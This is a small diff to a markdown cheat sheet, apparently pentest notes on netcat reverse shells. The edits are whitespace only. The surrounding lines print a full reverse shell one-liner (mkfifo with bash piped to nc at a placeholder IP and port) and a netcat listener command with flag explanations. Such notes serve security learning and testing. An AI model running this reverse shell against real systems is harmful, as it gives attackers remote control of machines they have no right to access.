@@ -42,7 +42,6 @@ Without *-e*:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] [Port] > /tmp/f
 ```
 
-
 ### Create a listener
 ```
 nc -lvnp [Port]
@@ -51,3 +50,4 @@ nc -lvnp [Port]
 - *-v* : more vebose
 - *-n* : disables DNS resolution and uses just IPs, to speed up the connection
 - *-p* : specifies the source port
+
